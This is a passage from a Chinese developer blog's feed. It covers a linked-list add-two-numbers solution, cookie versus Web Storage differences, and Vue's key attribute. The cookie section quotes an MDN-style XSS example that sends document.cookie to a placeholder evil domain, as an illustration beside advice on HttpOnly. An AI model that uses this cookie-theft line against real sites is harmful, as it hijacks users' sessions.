还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-代码缩减"><a href="#▉-代码缩减" class="headerlink" title="▉ 代码缩减:"></a>▉ 代码缩减:</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;        <span class="hljs-keyword">let</span> num2 = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        l1 为不为 <span class="hljs-literal">null</span> 才满足条件        l1 = l1 ? l1.next : l1;        l2 = l2 ? l2.next : l2;    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-总结：需要注意几点。"><a href="#▉-总结：需要注意几点。" class="headerlink" title="▉ 总结：需要注意几点。"></a>▉ 总结：需要注意几点。</h6><blockquote><p>1、<code> l1 = l1 ? l1.next : l1</code> 代表的是 l1 不等于 null 会去 l1.next 的值。</p><p>2、用到哨兵思想，所以注意当前的指针指向。</p><p>3、两位数取模运算。</p></blockquote><h6 id="▉-扩展："><a href="#▉-扩展：" class="headerlink" title="▉ 扩展："></a>▉ 扩展：</h6><blockquote><p>三位数怎么取得各个位置上的数字？（水仙花数）</p><p><strong>答：</strong></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//移动小数点向前一位，得到小数点后一位</span>个位：a = <span class="hljs-number">123</span> % <span class="hljs-number">10</span> = <span class="hljs-number">3</span><span class="hljs-comment">//移动小数点向前两位，得到小数点后两位，除以10取整</span>十位：b  = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">100</span>) / <span class="hljs-number">10</span>)<span class="hljs-comment">//移动小数点向前三位，得到小数点后三位，除以100取整</span>百位:：c = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">1000</span>) / <span class="hljs-number">100</span>)<span class="hljs-comment">//依次类推.....</span></code></pre></div><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>例子:</strong></p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><span class="hljs-string">.</span></code></pre></div><p><strong>解决:</strong> </p><h6 id="▉-算法思路：-1"><a href="#▉-算法思路：-1" class="headerlink" title="▉ 算法思路："></a>▉ 算法思路：</h6><blockquote><p>1）观察 Example 规律，关联到链表，用一个带头的链表存储。</p><p>2）多位数加多位数，反转链表转化整数，如果整数相加，可能会溢出，此方法行不通。</p><p>3）直接进行位数运算，两链表每取出一个就做运算，将结果放入到新链表中。</p></blockquote><h6 id="▉-临界条件："><a href="#▉-临界条件：" class="headerlink" title="▉ 临界条件："></a>▉ 临界条件：</h6><blockquote><p>1）一个链表比另一个链表长；</p><p>2）其中一个链表为 null。</p><p>3）求和运算会出现额外的进位（一般进位与最高位进位两种情况）。</p></blockquote><h6 id="▉-步骤：-1"><a href="#▉-步骤：-1" class="headerlink" title="▉ 步骤："></a>▉ 步骤：</h6><blockquote><p>1）遍历链表之前，要定义一个哨兵结点、临时结点、存储计算结果的结点、进位标志；</p><p>2）开始遍历数据，判断当前结点是否为 null，为 null 就用 0 代替，否则取出数值；</p><p>3）求和（加 carray 进位），判断是否进位？记录进位值；</p><p>4）求模取余，计算两位数的各位数存储到链表中，指针向后移动；</p><p>5）判断结点是否为 null，继续遍历（如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理）</p><ol start="6"><li>退出 while 循环勿忘最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位，存放到链表最后</li></ol></blockquote><h6 id="▉-代码实现：-1"><a href="#▉-代码实现：-1" class="headerlink" title="▉ 代码实现："></a>▉ 代码实现：</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 性能分析：</span><span class="hljs-comment"> * 1)遍历整个链表，时间复杂度为 O（n）。</span><span class="hljs-comment"> * 2)需要额外的 n 大小的空间存储 计算结果结点，空间复杂度为 O(n)。</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> num2 = <span class="hljs-number">0</span>;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 == <span class="hljs-literal">null</span></span>)</span>&#123;            num1 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num1 = l1.val;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 == <span class="hljs-literal">null</span></span>)</span>&#123;            num2 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num2 = l2.val;        &#125;        <span class="hljs-comment">// let num1 = l1 == null ? 0 : l1.val;</span>        <span class="hljs-comment">// let num2 = l2 == null ? 0 : l2.val;</span>        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l1 = l1.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l1 比 l2 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l1 = l1;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l2 = l2.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l2 = l2;        &#125;        <span class="hljs-comment">// l1 为不为 null 才满足条件</span>        <span class="hljs-comment">// l1 = l1 ? l1.next : l1;</span>        <span class="hljs-comment">// l2 = l2 ? l2.next : l2;</span>    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-代码缩减-1"><a href="#▉-代码缩减-1" class="headerlink" title="▉ 代码缩减:"></a>▉ 代码缩减:</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;        <span class="hljs-keyword">let</span> num2 = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        l1 为不为 <span class="hljs-literal">null</span> 才满足条件        l1 = l1 ? l1.next : l1;        l2 = l2 ? l2.next : l2;    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-总结：需要注意几点。-1"><a href="#▉-总结：需要注意几点。-1" class="headerlink" title="▉ 总结：需要注意几点。"></a>▉ 总结：需要注意几点。</h6><blockquote><p>1、<code> l1 = l1 ? l1.next : l1</code> 代表的是 l1 不等于 null 会去 l1.next 的值。</p><p>2、用到哨兵思想，所以注意当前的指针指向。</p><p>3、两位数取模运算。</p></blockquote><h6 id="▉-扩展：-1"><a href="#▉-扩展：-1" class="headerlink" title="▉ 扩展："></a>▉ 扩展：</h6><blockquote><p>三位数怎么取得各个位置上的数字？（水仙花数）</p><p><strong>答：</strong></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//移动小数点向前一位，得到小数点后一位</span>个位：a = <span class="hljs-number">123</span> % <span class="hljs-number">10</span> = <span class="hljs-number">3</span><span class="hljs-comment">//移动小数点向前两位，得到小数点后两位，除以10取整</span>十位：b  = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">100</span>) / <span class="hljs-number">10</span>)<span class="hljs-comment">//移动小数点向前三位，得到小数点后三位，除以100取整</span>百位:：c = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">1000</span>) / <span class="hljs-number">100</span>)<span class="hljs-comment">//依次类推.....</span></code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;题目：-2-替换空格&quot;&gt;&lt;a href=&quot;#题目：-2-替换空格&quot; class=&quot;headerlink&quot; title=&quot;题目：(2)替换空格&quot;&gt;&lt;/a&gt;题目：(2)替换空格&lt;/h4&gt;&lt;p&gt;在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排</summary>
      
    
    
    
    <category term="剑指offer" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
    <category term="剑指offer" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>块级元素与行内元素</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/09/sessionStage%E5%92%8ClocalStage/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/09/sessionStage%E5%92%8ClocalStage/</id>
    <published>2021-09-09T02:00:00.000Z</published>
    <updated>2021-10-11T17:20:33.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cookie，sessionStorage-和-localStorage-的区别-cake"><a href="#cookie，sessionStorage-和-localStorage-的区别-cake" class="headerlink" title="cookie，sessionStorage 和 localStorage 的区别 :cake:"></a>cookie，sessionStorage 和 localStorage 的区别 :cake:</h1><h2 id="前言-pencil"><a href="#前言-pencil" class="headerlink" title="前言:pencil:"></a>前言:pencil:</h2><p>:label: cookie，localStorage，sessionStorage都是在客户端保存数据的，存储数据的类型：都是字符串。</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><ul><li><p><code>cookie</code>是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）</p></li><li><p>cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递</p><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 读取所有可从此位置访问的CookieallCookies = document.cookie;<span class="hljs-regexp">//</span> 写一个新 cookiedocument.cookie = newCookie;<span class="hljs-regexp">//</span> 每条cookie以<span class="hljs-string">&quot;分号和空格(; )&quot;</span>分隔(即, key=value 键值对)。document.cookie = <span class="hljs-string">&quot;name=oeschger&quot;</span>;document.cookie = <span class="hljs-string">&quot;favorite_food=tripe&quot;</span>;alert(document.cookie);<span class="hljs-regexp">//</span> 显示: name=oeschger;favorite_food=tripe</code></pre></div></li></ul><p>安全：(MDN)</p><p>路径限制并<strong>不能</strong>阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">iframe</a>, 然后访问其 <code>contentDocument.cookie</code> 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">同源策略</a>保护其不被读取.</p><p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -</p><div class="hljs code-wrapper"><pre><code class="hljs coffeescript">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;</code></pre></div><p><code>HttpOnly</code> 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 <a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p><p>​    </p><h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><p><code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型</p><p>localStorage的生命周期是永久的，关闭页面或浏览器之后localStorage中的数据也不会消失。localStorage除非主动删除数据，否则数据永远不会消失。</p><h2 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h2><ul><li><p>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</p></li><li><p><strong>在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，</strong>这点和 session cookies 的运行方式不同。</p></li><li><p>打开多个相同的URL的Tabs页面，会创建各自的<code>sessionStorage</code>。</p></li><li><p>关闭对应浏览器窗口（Window）/ tab，会清除对应的<code>sessionStorage</code>。 </p><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 保存数据到 sessionStoragesessionStorage.setItem(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<span class="hljs-regexp">//</span> 从 sessionStorage 获取数据let data = sessionStorage.getItem(<span class="hljs-string">&#x27;key&#x27;</span>);<span class="hljs-regexp">//</span> 从 sessionStorage 删除保存的数据sessionStorage.removeItem(<span class="hljs-string">&#x27;key&#x27;</span>);<span class="hljs-regexp">//</span> 从 sessionStorage 删除所有保存的数据sessionStorage.clear();</code></pre></div></li></ul><h2 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h2><ul><li><code>sessionStorage</code>和<code>localStorage</code>不会自动把数据发给服务器，仅在本地保存</li><li>存储大小：<ul><li><code>cookie</code>数据大小不能超过4k</li><li><code>sessionStorage</code>和<code>localStorage</code>虽然也有存储大小的限制，但比<code>cookie</code>大得多，可以达到5M或更大</li></ul></li><li>有期时间：<ul><li><code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据</li><li><code>sessionStorage</code> 数据在当前浏览器窗口关闭后自动删除</li><li><code>cookie</code> 设置的<code>cookie</code>过期时间之前一直有效，即使窗口或浏览器关闭</li></ul></li></ul><h2 id="注意-circus-tent"><a href="#注意-circus-tent" class="headerlink" title="注意 :circus_tent:"></a>注意 :circus_tent:</h2><p><code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;cookie，sessionStorage-和-localStorage-的区别-cake&quot;&gt;&lt;a href=&quot;#cookie，sessionStorage-和-localStorage-的区别-cake&quot; class=&quot;headerlink&quot; title=&quot;co</summary>
      
    
    
    
    <category term="html" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/html/"/>
    
    
    <category term="html" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>vue中key的作用</title>
    <link href="https://zhouhang-hello.gitee.io/hexo_blog/2021/09/09/vue%E7%9A%84key/"/>
    <id>https://zhouhang-hello.gitee.io/hexo_blog/2021/09/09/vue%E7%9A%84key/</id>
    <published>2021-09-09T02:00:00.000Z</published>
    <updated>2021-10-11T17:20:51.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vue中key的作用"><a href="#vue中key的作用" class="headerlink" title="vue中key的作用"></a>vue中key的作用</h1><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><div class="hljs code-wrapper"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;example-1&quot;</span>&gt;</span></span><span class="xml">  </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in items&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;item.message&quot;</span>&gt;</span></span><span class="xml">    </span><span class="xquery">&#123;&#123; <span class="hljs-type">item</span>.message &#125;</span><span class="xml">&#125;</span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>var example1 = new Vue(&#123;  el: <span class="hljs-string">&#x27;#example-1&#x27;</span>,  data: &#123;    items: [      &#123; message: <span class="hljs-string">&#x27;Foo&#x27;</span> &#125;,      &#123; message: <span class="hljs-string">&#x27;Bar&#x27;</span> &#125;    ]  &#125;&#125;)</code></pre></div><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>vue 中 key 值的作用可以分为两种情况来考虑。</p><p>第一种情况是 v-if 中使用 key。由于 Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染。因此当我们使用 v-if 来实现元素切换的时候，如果切换前后含有相同类型的元素，那么这个元素就会被复用。如果是相同的 input 元素，那么切换前后用户的输入不会被清除掉，这样是不符合需求的。因此我们可以通过使用 key 来唯一的标识一个元素，这个情况下，使用 key 的元素不会被复用。这个时候 key 的作用是用来标识一个独立的元素。</p><p>第二种情况是 v-for 中使用 key。用 v-for 更新已渲染过的元素列表时，它默认使用“就地复用”的策略。如果数据项的顺序发生了改变，Vue 不会移动 DOM 元素来匹配数据项的顺序，而是简单复用此处的每个元素。因此通过为每个列表项提供一个 key 值，来以便 Vue 跟踪元素的身份，从而高效的实现复用。这个时候 key 的作用是为了高效的更新渲染虚拟 DOM。</p><ul><li>key是为Vue中的vnode标记的唯一id,通过这个key,我们的diff操作可以更准确、更快速</li><li>diff算法的过程中,先会进行新旧节点的首尾交叉对比,当无法匹配的时候会用新节点的key与旧节点进行比对,然后超出差异.</li></ul><blockquote><p>diff程可以概括为：oldCh和newCh各有两个头尾的变量StartIdx和EndIdx，它们的2个变量相互比较，一共有4种比较方式。如果4种比较都没匹配，如果设置了key，就会用key进行比较，在比较的过程中，变量会往中间靠，一旦StartIdx&gt;EndIdx表明oldCh和newCh至少有一个已经遍历完了，就会结束比较,这四种比较方式就是首、尾、旧尾新头、旧头新尾.</p></blockquote><blockquote><p>准确: 如果不加key,那么vue会选择复用节点(Vue的就地更新策略),导致之前节点的状态被保留下来,会产生一系列的bug. 快速: key的唯一性可以被Map数据结构充分利用,相比于遍历查找的时间复杂度<code>O(n)</code>,<code>Map</code>的时间复杂度仅仅为<code>O(1)</code>.</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>key</code>的作用是尽可能的复用 DOM 元素。</p><p>新旧 children 中的节点只有顺序是不同的时候，最佳的操作应该是通过移动元素的位置来达到更新的目的。</p><p>需要在新旧 children 的节点中保存映射关系，以便能够在旧 children 的节点中找到可复用的节点。key也就是children中节点的唯一标识。</p><h2 id="面试-taco"><a href="#面试-taco" class="headerlink" title="面试 :taco:"></a>面试 :taco:</h2><h3 id="如果我将key设置为了一个Math-random-可以吗"><a href="#如果我将key设置为了一个Math-random-可以吗" class="headerlink" title="如果我将key设置为了一个Math.random()可以吗"></a>如果我将key设置为了一个Math.random()可以吗</h3><p><code>key</code>它就是为了保证我们的DOM节点能够复用，如果你都把它设置为了一个随机数的话，那每次重写渲染都会是另一个数了根本不可能达到复用的效果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vue中key的作用&quot;&gt;&lt;a href=&quot;#vue中key的作用&quot; class=&quot;headerlink&quot; title=&quot;vue中key的作用&quot;&gt;&lt;/a&gt;vue中key的作用&lt;/h1&gt;&lt;h2 id=&quot;用法&quot;&gt;&lt;a href=&quot;#用法&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="vue" scheme="https://zhouhang-hello.gitee.io/hexo_blog/categories/vue/"/>
    
    
    <category term="vue" scheme="https://zhouhang-hello.gitee.io/hexo_blog/tags/vue/"/>
    
  </entry>
  
</feed>
